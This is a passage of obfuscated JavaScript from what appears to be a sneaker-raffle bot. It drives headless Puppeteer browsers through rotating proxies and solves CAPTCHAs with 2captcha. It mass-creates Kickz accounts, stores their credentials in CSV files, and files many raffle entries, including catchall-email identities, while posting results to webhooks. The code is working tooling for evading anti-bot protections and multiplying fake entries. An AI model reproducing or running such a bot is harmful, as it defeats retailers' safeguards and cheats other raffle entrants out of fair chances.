                const _0x5b63d1 = await _0x491972['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x1c8f1c => {
                    return _0x1c8f1c['map'](_0x107f0a => _0x107f0a['href']);
                });
                var _0x56aabd = Math['round'](Math['random']() * (_0x5b63d1['length'] - 0x1));
                await _0x491972['goto']('' + _0x5b63d1[_0x56aabd]);
            } else {
                console['log'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1cb26e[_0x2579d3]['Size']);
                try {
                    const _0x2d5c6e = await _0x491972['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x1cb26e[_0x2579d3]['Size'] + '\x22]\x20>\x20a', _0x199144 => {
                        return _0x199144['map'](_0x42292c => _0x42292c['href']);
                    });
                    await _0x491972['goto']('' + _0x2d5c6e[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x2e9d38) {
                    console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20' + _0x2e9d38 + '\x20Size\x20not\x20found')), _0x1339d5 = 'Size\x20Not\x20Found';
                    var _0x25d358 = await _0x555e75(_0x1cb26e[_0x2579d3], _0xa05eae, 'dev', !![], _0x1339d5);
                    _0x492f77['errorDEV'] = { 'embeds': [_0x25d358] };
                    _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x492f77['errorDEV']);
                    await _0x57e113(_0x570583, _0x492f77['errorDEV']);
                    continue;
                }
            }
            await _0x491972['waitForTimeout'](0x258), await _0x491972['type']('#raffle-instagram', '' + _0x1cb26e[_0x2579d3]['Follower'], { 'delay': 0x64 }), await _0x491972['waitForTimeout'](0x384), await _0x491972['click']('#raffle-terms'), await _0x491972['waitForTimeout'](0x384), await _0x491972['evaluate'](() => {
                const _0x273ef2 = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x273ef2['click']();
            }), await _0x491972['waitForTimeout'](0xbb8), await _0x491972['waitForSelector']('#checkout_email'), await _0x1b3ea1(0x3e8), console['log'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Filling\x20Information');
            _0x5ac109 == 'sec' ? await _0x491972['type']('#checkout_email', '' + _0x1cb26e[_0x2579d3]['FirstName'] + _0x1cb26e[_0x2579d3]['LastName'] + _0xc43b8d['catchall'], 0x32) : await _0x491972['type']('#checkout_email', '' + _0x1cb26e[_0x2579d3]['Email'], 0x32);
            await _0x1b3ea1(0x320), await _0x491972['select']('#checkout_shipping_address_country', '' + _0x1cb26e[_0x2579d3]['Country']), await _0x491972['waitForTimeout'](0x258), await _0x491972['type']('#checkout_shipping_address_first_name', '' + _0x1cb26e[_0x2579d3]['FirstName']), await _0x491972['waitForTimeout'](0x320), await _0x491972['type']('#checkout_shipping_address_last_name', '' + _0x1cb26e[_0x2579d3]['LastName']), await _0x491972['waitForTimeout'](0x2bc), await _0x491972['type']('#checkout_shipping_address_address1', _0x1cb26e[_0x2579d3]['Address1'] + '\x20' + _0x1cb26e[_0x2579d3]['HouseNumber']), await _0x491972['waitForTimeout'](0x2bc), await _0x491972['type']('#checkout_shipping_address_address2', '' + _0x1cb26e[_0x2579d3]['Address2']), await _0x491972['waitForTimeout'](0x2bc);
            _0x1cb26e[_0x2579d3]['Postcode'] == undefined ? await _0x491972['type']('#checkout_shipping_address_zip', '' + _0x1cb26e[_0x2579d3]['Zip']) : await _0x491972['type']('#checkout_shipping_address_zip', '' + _0x1cb26e[_0x2579d3]['Postcode']);
            await _0x491972['waitForTimeout'](0x2bc), await _0x491972['type']('#checkout_shipping_address_city', '' + _0x1cb26e[_0x2579d3]['City']), await _0x491972['waitForTimeout'](0x2bc), console['log'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x491972, _0x491972['evaluate'](() => {
                const _0x1b0906 = document['querySelector']('#continue_button');
                for (var _0x4527a0 = 0x0; _0x4527a0 < 0x5; _0x4527a0++) {
                    if (_0x1b0906) {
                        _0x1b0906['click'](), _0x1b0906['click']();
                        break;
                    } else
                        _0x1b3ea1(0xfa0);
                }
            }), await _0x491972['waitForTimeout'](0x1194);
            try {
                await _0x491972['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x491972['evaluate'](() => {
                const _0x52b527 = document['querySelector']('#continue_button');
                for (var _0xb5217a = 0x0; _0xb5217a < 0x5; _0xb5217a++) {
                    if (_0x52b527) {
                        _0x52b527['click']();
                        break;
                    } else
                        _0x1b3ea1(0xfa0);
                }
            }), await _0x491972['waitForTimeout'](0x7d0), console['log'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x491972['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x491972['evaluate'](() => {
                const _0x16b02e = document['querySelector']('#continue_button');
                for (var _0x30dcf6 = 0x0; _0x30dcf6 < 0x5; _0x30dcf6++) {
                    if (_0x16b02e) {
                        _0x16b02e['click']();
                        break;
                    } else
                        _0x1b3ea1(0xfa0);
                }
            }), await _0x491972['waitForTimeout'](0x1194), await _0x491972['waitForSelector']('#continue_button'), _0x491972['evaluate'](() => {
                const _0x58219b = document['querySelector']('#continue_button');
                for (var _0x34b138 = 0x0; _0x34b138 < 0x5; _0x34b138++) {
                    if (_0x58219b) {
                        _0x58219b['click']();
                        break;
                    } else
                        _0x1b3ea1(0xfa0);
                }
            });
            try {
                await _0x491972['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x300212 = 'no', _0x1dc885(_0x1cb26e[_0x2579d3], _0xa05eae), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '')
                    try {
                        await _0x57e113(_0xc43b8d['webhook'], _0x492f77['succesDEVMSG']);
                    } catch {
                    }
                await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0x492f77['succesDEVMSG']), await _0x1b3ea1(0xc8);
                try {
                    await _0x57e113(_0x45d3b5, _0x492f77['succesPUBMSG']);
                } catch {
                }
            } catch (_0x24e559) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x24e559));
            }
        } catch (_0x4cb288) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20' + _0x4cb288)), _0x1339d5 = '' + _0x4cb288;
            var _0x25d358 = await _0x555e75(_0x1cb26e[_0x2579d3], _0xa05eae, 'dev', !![], _0x1339d5);
            _0x492f77['errorDEV'] = { 'embeds': [_0x25d358] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x492f77['errorDEV']), await _0x57e113(_0x570583, _0x492f77['errorDEV']), _0x300212 = 'yes';
        } finally {
            _0x137619 && _0x137619['close']();
            if (_0x300212 == 'yes' && _0x46ae9d != 0x5 && _0x1339d5 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Retrying')), _0x2579d3 = _0x2579d3 - 0x1, _0x46ae9d = _0x46ae9d + 0x1;
                continue;
            }
            _0x300212 == 'yes' && _0x46ae9d >= 0x5 && (_0x254c07(_0x1cb26e[_0x2579d3], _0xa05eae), _0x300212 = 'no', _0x46ae9d = 0x0);
            if (_0x2579d3 + 0x1 == _0x1cb26e['length']) {
                console['log'](_0x3e492c['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x1b3ea1(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0xc43b8d['AfewDelay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['AfewDelay']);
        }
    }
};
async function _0x2f0d12(_0x5c9f27, _0x5443e7, _0x549455, _0x27b720) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x12d795 = 0x0; _0x12d795 < _0x549455['length']; _0x12d795++) {
        if (_0x37024e != 'yes')
            var _0x37024e = '', _0x330d1f = 0x0;
        _0x2768f8(_0x5443e7['name'] + '\x20Task\x20' + (_0x12d795 + 0x1) + '\x20/\x20' + _0x549455['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247), await _0x3cdb09(_0x549455, _0x12d795);
        var _0x4440c6 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x57b088
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xc43b8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x44c289
                }
            ]
        }];
        const _0x4502b8 = { 'embeds': _0x4440c6 };
        var _0x1ac717 = await _0x555e75(_0x549455[_0x12d795], _0x5443e7, 'acc', ![]);
        const _0x49271a = { 'succesDEVMSG': { 'embeds': [_0x1ac717] } };
        if (_0x549455[_0x12d795]['Email'] == '' || _0x549455[_0x12d795]['FirstName'] == '' || _0x549455[_0x12d795]['LastName'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x549455[_0x12d795]['Password'] == '' && (_0x549455[_0x12d795]['Password'] = 'JRaffles23!');
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x3039b9 = _0x27b720[_0x12d795]['split'](':');
        else
            var _0x3945bb = Math['round'](Math['random']() * (_0x27b720['length'] - 0x1)), _0x3039b9 = _0x27b720[_0x3945bb]['split'](':');
        const _0x1003d3 = await _0x114f6['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3039b9[0x0] + ':' + _0x3039b9[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x588a0c = await _0x1003d3['newPage']();
            await _0x588a0c['authenticate']({
                'username': '' + _0x3039b9[0x2],
                'password': '' + _0x3039b9[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x588a0c['setRequestInterception'](!![]), _0x588a0c['on']('request', _0x44cf2b => {
                _0x44cf2b['resourceType']() === 'image' || _0x44cf2b['resourceType']() === 'font' || _0x44cf2b['resourceType']() === 'media' ? _0x44cf2b['abort']() : _0x44cf2b['continue']();
            }), await _0x588a0c['goto'](_0x5c9f27), await _0x1b3ea1(0xbb8), console['log'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x588a0c['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x588a0c['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x588a0c['waitForSelector']('#button-register'), await _0x1b3ea1(0x7d0), await _0x588a0c['evaluate'](() => {
                const _0x42ea21 = document['querySelector']('#button-register');
                _0x42ea21['click']();
            }), console['log'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1b3ea1(0x1388), await _0x588a0c['waitForSelector']('#customer_salutation'), await _0x588a0c['select']('#customer_salutation', 'mr'), await _0x1b3ea1(0x7d0), await _0x588a0c['waitForSelector']('#customer_firstname'), await _0x588a0c['type']('#customer_firstname', '' + _0x549455[_0x12d795]['FirstName']), await _0x1b3ea1(0x352), await _0x588a0c['waitForSelector']('#customer_lastname'), await _0x588a0c['type']('#customer_lastname', '' + _0x549455[_0x12d795]['LastName']), await _0x1b3ea1(0x352), await _0x588a0c['type']('#email-input', '' + _0x549455[_0x12d795]['Email']), await _0x1b3ea1(0x352), await _0x588a0c['type']('#email-confirm-input', '' + _0x549455[_0x12d795]['Email']), await _0x1b3ea1(0x352), await _0x588a0c['type']('#register-password', '' + _0x549455[_0x12d795]['Password']), await _0x1b3ea1(0x352), await _0x588a0c['type']('#password-confirm', '' + _0x549455[_0x12d795]['Password']), await _0x1b3ea1(0x352), console['log'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x588a0c['click']('#consent'), await _0x1b3ea1(0x1f4);
            const _0x416923 = await _0x588a0c['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x416923) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x588a0c['click']('#buttonRegister');
            try {
                await _0x588a0c['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Account\x20' + _0x549455[_0x12d795]['Email'] + '\x20Generated!')), console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x549455[_0x12d795]['Email'])), await _0x1b3ea1(0x4b0);
            async function _0x374f93() {
                console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x43968b = await _0x465bea['get']('Code');
                return _0x43968b['Code'];
            }
            ;
            code = await _0x374f93(), _0x1b3ea1(0x320), console['log'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Verifying..'), await _0x588a0c['type']('#verificationCode', code), await _0x1b3ea1(0x1f4), await _0x588a0c['click']('#buttonVerify'), await _0x1b3ea1(0x190), await _0x588a0c['click']('#buttonVerify'), await _0x1b3ea1(0x3e8);
            try {
                await _0x588a0c['waitForSelector']('div.b-user_greeting'), _0x37024e = 'no', console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Account\x20' + _0x549455[_0x12d795]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x16016b['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x549455[_0x12d795]['Email'] + ',' + _0x549455[_0x12d795]['Password'] + ','), console['log'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Account\x20' + _0x549455[_0x12d795]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x49271a['succesDEVMSG']);
                } catch {
                }
                await _0x57e113(_0x4f5698, _0x49271a['succesDEVMSG']);
            } catch {
                _0x37024e = 'no', console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x1e5c19) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20' + _0x1e5c19)), _0x4440c6[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x4440c6[0x0]['description'] = '' + _0x1e5c19, await _0x57e113(_0x570583, _0x4502b8), _0x37024e = 'yes';
        } finally {
            _0x1003d3 && _0x1003d3['close']();
            if (_0x37024e == 'yes' && _0x330d1f != 0x5) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5443e7['name'] + ']\x20Task\x20' + (_0x12d795 + 0x1) + '\x20:\x20Retrying')), _0x12d795 = _0x12d795 - 0x1, _0x330d1f = _0x330d1f + 0x1;
                continue;
            }
            _0x37024e == 'yes' && _0x330d1f >= 0x5 && (_0x254c07(_0x549455[_0x12d795], _0x5443e7), _0x37024e = 'no', _0x330d1f = 0x0), console['log']('Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x3e9e3d(_0x113783, _0x2f1942, _0x17d3d8) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x42d87b = 0x0; _0x42d87b < _0x2f1942['length']; _0x42d87b++) {
        var _0x285249;
        if (_0x51785d != 'yes')
            var _0x51785d = '', _0x491076 = 0x0;
        _0x2768f8(_0x113783['name'] + '\x20Task\x20' + (_0x42d87b + 0x1) + '\x20/\x20' + _0x2f1942['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247);
        var _0x8df0c0 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x57b088
                },
                {
                    'name': 'Product',
                    'value': '' + _0x2f1942[_0x42d87b]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2f1942[_0x42d87b]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xc43b8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x44c289
                }
            ]
        }], _0x349bc9 = await _0x555e75(_0x2f1942[_0x42d87b], _0x113783, 'dev', ![]), _0x1274a5 = await _0x555e75(_0x2f1942[_0x42d87b], _0x113783, 'pub', ![]);
        const _0x280255 = {
            'succesDEVMSG': { 'embeds': [_0x349bc9] },
            'succesPUBMSG': { 'embeds': [_0x1274a5] }
        };
        await _0x3cdb09(_0x2f1942, _0x42d87b);
        if (_0x2f1942[_0x42d87b]['Email'] == '' || _0x2f1942[_0x42d87b]['Password'] == '' || _0x2f1942[_0x42d87b]['FirstName'] == '' || _0x2f1942[_0x42d87b]['LastName'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x280e67 = _0x17d3d8[_0x42d87b]['split'](':');
        else
            var _0x436244 = Math['round'](Math['random']() * (_0x17d3d8['length'] - 0x1)), _0x280e67 = _0x17d3d8[_0x436244]['split'](':');
        const _0x7571f6 = await _0x114f6['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x280e67[0x0] + ':' + _0x280e67[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xb6ce43 = await _0x7571f6['newPage']();
            await _0xb6ce43['authenticate']({
                'username': '' + _0x280e67[0x2],
                'password': '' + _0x280e67[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20Getting\x20Session'), await _0xb6ce43['setRequestInterception'](!![]), _0xb6ce43['on']('request', _0x126bab => {
                _0x126bab['resourceType']() === 'image' || _0x126bab['resourceType']() === 'font' || _0x126bab['resourceType']() === 'media' ? _0x126bab['abort']() : _0x126bab['continue']();
            }), await _0xb6ce43['goto']('' + _0x2f1942[_0x42d87b]['Url'], { 'waitUntil': 'networkidle2' }), await _0x1b3ea1(0x12c);
            try {
                await _0xb6ce43['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0xb6ce43['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20Logging\x20in'), await _0xb6ce43['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xb6ce43['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xb6ce43['waitForSelector']('#username'), await _0xb6ce43['type']('#username', _0x2f1942[_0x42d87b]['Email']), await _0xb6ce43['waitForSelector']('#password'), await _0xb6ce43['type']('#password', _0x2f1942[_0x42d87b]['Password']), await _0x1b3ea1(0x190), await _0xb6ce43['click']('#buttonSubmit'), await _0xb6ce43['waitForSelector']('div.b-user_greeting'), console['log'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20Getting\x20Product'), await _0x1b3ea1(0x1f4), await _0xb6ce43['goto']('' + _0x2f1942[_0x42d87b]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x2f1942[_0x42d87b]['Size']);
            let _0x75e39 = _0x2f1942[_0x42d87b]['Size']['replace']('.5', '\x201/2');
            await _0xb6ce43['click']('button[title=\x22' + _0x75e39 + '\x22]'), await _0x1b3ea1(0x1f4);
            try {
                await _0xb6ce43['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x1b3ea1(0x12c), console['log'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20Filling\x20Information'), await _0xb6ce43['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x1b3ea1(0x12c), await _0xb6ce43['type']('#dwfrm_raffle_addressFields_firstName', _0x2f1942[_0x42d87b]['FirstName']), await _0x1b3ea1(0x12c), await _0xb6ce43['type']('#dwfrm_raffle_addressFields_lastName', _0x2f1942[_0x42d87b]['LastName']), await _0x1b3ea1(0x12c), await _0xb6ce43['select']('#dwfrm_raffle_addressFields_country', _0x2f1942[_0x42d87b]['Country']), await _0x1b3ea1(0x12c), await _0xb6ce43['type']('#dwfrm_raffle_addressFields_city', _0x2f1942[_0x42d87b]['City']), await _0x1b3ea1(0x12c);
            _0x2f1942[_0x42d87b]['Postcode'] == undefined && (_0x2f1942[_0x42d87b]['Postcode'] = _0x2f1942[_0x42d87b]['Zip']);
            await _0xb6ce43['type']('#dwfrm_raffle_addressFields_postalCode', _0x2f1942[_0x42d87b]['Postcode']), await _0x1b3ea1(0x12c), await _0xb6ce43['type']('#dwfrm_raffle_addressFields_address1', _0x2f1942[_0x42d87b]['Address1']), await _0x1b3ea1(0x12c), await _0xb6ce43['type']('#dwfrm_raffle_addressFields_address2', _0x2f1942[_0x42d87b]['HouseNumber']), await _0x1b3ea1(0x12c), await _0xb6ce43['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x2f1942[_0x42d87b]['Address2']), await _0x1b3ea1(0x12c), await _0xb6ce43['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x1b3ea1(0x12c), await _0xb6ce43['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x2f1942[_0x42d87b]['Follower']), await _0x1b3ea1(0x1f4), await _0xb6ce43['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x1b3ea1(0x1f4), console['log'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20' + _0x3e492c['blue']('Awaiting\x20Paypal\x20Payment')), await _0xb6ce43['click']('.b-paypal_button');
            try {
                await _0xb6ce43['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x51785d = 'no', _0x1dc885(_0x2f1942[_0x42d87b], _0x113783), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x280255['succesDEVMSG']), await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0x280255['succesDEVMSG']), await _0x1b3ea1(0xc8), await _0x57e113(_0x45d3b5, _0x280255['succesPUBMSG']);
            } catch (_0x3d4e8d) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x3d4e8d)), _0x285249 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x3d4e8d;
                var _0x256a06 = await _0x555e75(_0x2f1942[_0x42d87b], _0x113783, 'dev', !![], _0x285249);
                _0x280255['errorDEV'] = { 'embeds': [_0x256a06] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x280255['errorDEV']), await _0x57e113(_0x570583, _0x280255['errorDEV']);
            }
        } catch (_0x18e326) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20' + _0x18e326)), _0x285249 = '' + _0x18e326;
            var _0x256a06 = await _0x555e75(_0x2f1942[_0x42d87b], _0x113783, 'dev', !![], _0x285249);
            _0x280255['errorDEV'] = { 'embeds': [_0x256a06] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x280255['errorDEV']), await _0x57e113(_0x570583, _0x280255['errorDEV']), _0x51785d = 'yes';
        } finally {
            _0x7571f6 && _0x7571f6['close']();
            if (_0x51785d == 'yes' && _0x491076 != 0x5) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x113783['name'] + ']\x20Task\x20' + (_0x42d87b + 0x1) + '\x20:\x20Retrying')), _0x42d87b = _0x42d87b - 0x1, _0x491076 = _0x491076 + 0x1;
                continue;
            }
            _0x51785d == 'yes' && _0x491076 >= 0x5 && (_0x254c07(_0x2f1942[_0x42d87b], _0x113783), _0x51785d = 'no', _0x491076 = 0x0), console['log']('Waiting\x20for\x20' + _0xc43b8d['AfewDelay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['AfewDelay']);
        }
    }
}
async function _0x2eb833(_0x7fd3b, _0x75c43) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4addb5 = 0x0; _0x4addb5 < bouncewear['length']; _0x4addb5++) {
        await _0x3cdb09(bouncewear, _0x4addb5);
        if (bouncewear[_0x4addb5]['Email'] == '' || bouncewear[_0x4addb5]['Password'] == '' || bouncewear[_0x4addb5]['FirstName'] == '' || bouncewear[_0x4addb5]['LastName'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x38c504 = _0x663aab()[_0x4addb5]['split'](':');
        else
            var _0x3912ab = Math['round'](Math['random']() * (_0x663aab()['length'] - 0x1)), _0x38c504 = _0x663aab()[_0x3912ab]['split'](':');
        const _0x2fc3b2 = await _0x114f6['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x38c504[0x0] + ':' + _0x38c504[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4650f8 = await _0x2fc3b2['newPage']();
            await _0x4650f8['authenticate']({
                'username': '' + _0x38c504[0x2],
                'password': '' + _0x38c504[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x75c43['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4650f8['setRequestInterception'](!![]), _0x4650f8['on']('request', _0x303426 => {
                _0x303426['resourceType']() === 'image' || _0x303426['resourceType']() === 'font' || _0x303426['resourceType']() === 'media' ? _0x303426['abort']() : _0x303426['continue']();
